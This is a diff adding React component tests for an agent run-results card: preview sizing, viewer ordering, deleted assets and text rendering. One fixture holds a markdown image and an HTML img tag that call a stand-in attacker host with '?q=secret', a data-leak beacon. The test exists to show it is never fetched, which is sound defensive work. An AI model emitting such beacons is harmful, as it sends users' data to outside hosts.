@@ -15,11 +15,17 @@ vi.mock("@/utils/logger", () => ({
 }));
 const download = vi.hoisted(() => vi.fn().mockResolvedValue(undefined));
 vi.mock("@/utils/downloadMedia", () => ({ downloadMedia: download }));
+// The library's answer on whether a record's assets still exist: unknown (nothing changes) unless a test says otherwise.
+const existence = vi.hoisted(() => vi.fn(async (ids: string[]) => Object.fromEntries(ids.map((id) => [id, "unknown"]))));
+vi.mock("@/lib/assets/client/api", async (importOriginal) => ({
+  ...(await importOriginal<typeof import("@/lib/assets/client/api")>()),
+  fetchAssetExistence: existence,
+}));
 
 import { AgentTranscriptActionsProvider, type AgentTranscriptActions } from "@/components/agent/AgentSession";
 import { AgentSurfaceProvider, type AgentSurface } from "@/components/agent/AgentSurface";
 import { AgentRunResults, fixRequestMessage, formatElapsed, orderPreviews, pendingOutputs } from "@/components/agent/AgentRunResults";
-import { fitPreviews, MEDIA_RETRY_MS, PREVIEW_HEIGHT, withLineBreaks, type RunVisual } from "@/components/agent/AgentRunMedia";
+import { fitPreviews, MEDIA_RETRY_MS, PREVIEW_HEIGHT, RunTextCard, withLineBreaks, type RunVisual } from "@/components/agent/AgentRunMedia";
 import type { AgentRunOutput, AgentRunRecord } from "@/lib/agent/types";
 import { useAssetStore } from "@/store/assetStore";
 import { useWorkflowStore } from "@/store/workflowStore";
@@ -368,6 +374,23 @@ describe("AgentRunResults outputs", () => {
     expect(within(screen.getByRole("dialog", { name: "Run workflow" })).getByText("3 of 5")).toBeInTheDocument();
   });
 
+  it("never makes a preview wider than its row: a panorama is cropped to fit", () => {
+    rowWidth.mockReturnValue(388);
+    const { container } = renderCard(record({ outputs: [image("pano", "gen", { width: 4096, height: 1024 })] }));
+    expect(frames(container)).toEqual([[388, 120]]);
+  });
+
+  it("leaves +N inert when what it stands for can't be opened yet", () => {
+    rowWidth.mockReturnValue(220);
+    // The second output is only on its node, and the run's tab is not the one on show: nothing to open.
+    useWorkflowStore.setState({ activeTabId: "tab-b", tabs: [{ id: "tab-a", snapshot: null }, { id: "tab-b", snapshot: null }] });
+    const live = image("gen:1", "gen", { assetId: undefined, sha256: undefined, live: true });
+    const { container } = renderCard(record({ outputs: [image("img-1"), live] }));
+    const row = container.querySelector('[data-run-media="row"]') as HTMLElement;
+    expect(row).toHaveAttribute("data-shown", "1");
+    expect(within(row).getByRole("button", { name: "Show all 2" })).toBeDisabled();
+  });
+
   it("orders previews by run, then by the workflow's order, and tags each with its run", () => {
     const a = (batchIndex: number) => image(`a${batchIndex}`, "a", { nodeTitle: "Portrait", batchIndex });
     const b = (batchIndex: number) => image(`b${batchIndex}`, "b", { nodeTitle: "Wide", batchIndex });
@@ -464,6 +487,25 @@ describe("AgentRunResults viewer", () => {
     fireEvent.click(within(viewer).getByRole("button", { name: "Show on canvas" }));
     expect(transcript!.showOnCanvas).toHaveBeenCalledWith({ tabId: "tab-a", nodeIds: ["gen"] });
     expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
+  });
+
+  it("steps through the outputs in the row's order, not the order they arrived in", () => {
+    // b finished first, so it was recorded first; the row (and so the viewer) reads a, then b.
+    renderCard(record({ plannedNodeIds: ["a", "b"], outputs: [image("b0", "b", { nodeTitle: "Second" }), image("a0", "a", { nodeTitle: "First" })] }));
+    fireEvent.click(screen.getByRole("button", { name: "Open First's image" }));
+    const viewer = screen.getByRole("dialog", { name: "Run workflow" });
+    expect(within(viewer).getByText("1 of 2")).toBeInTheDocument();
+    fireEvent.keyDown(viewer, { key: "ArrowRight" });
+    expect(within(viewer).getByText("2 of 2")).toBeInTheDocument();
+  });
+
+  it("shows an output deleted from the library as unavailable, and keeps it out of the viewer", async () => {
+    existence.mockImplementationOnce(async (ids: string[]) => Object.fromEntries(ids.map((id) => [id, id === "img-2" ? "gone" : "present"])));
+    renderCard(record({ outputs: [image("img-1"), image("img-2")] }));
+    await screen.findByText("Open the canvas to see it");
+    expect(screen.getAllByRole("button", { name: "Open Generate Image's image" })).toHaveLength(1);
+    fireEvent.click(screen.getByRole("button", { name: "Open Generate Image's image" }));
+    expect(within(screen.getByRole("dialog", { name: "Run workflow" })).getByText("1 of 1")).toBeInTheDocument();
   });
 
   it("closes on Escape without the key reaching the window around the card", () => {
@@ -613,5 +655,21 @@ describe("withLineBreaks", () => {
   it("leaves paragraph breaks and fenced code alone", () => {
     expect(withLineBreaks("One\n\nTwo")).toBe("One\n\nTwo");
     expect(withLineBreaks("```\na = 1\nb = 2\n```\nafter")).toBe("```\na = 1\nb = 2\n```\nafter");
+  });
+});
+
+describe("RunTextCard", () => {
+  it("never fetches an image a node's text names, in markdown or raw HTML", () => {
+    const text: AgentRunOutput = {
+      id: "llm:0",
+      nodeId: "llm",
+      nodeTitle: "LLM Generate",
+      nodeType: "llmGenerate",
+      kind: "text",
+      text: 'A tagline. ![pixel](https://evil.example/p.png?q=secret) and <img src="https://evil.example/raw.png">',
+    };
+    const { container } = render(<RunTextCard output={text} />);
+    expect(container.querySelector("img")).toBeNull();
+    expect(container).toHaveTextContent("[image: pixel https://evil.example/p.png?q=secret]");
   });
 });
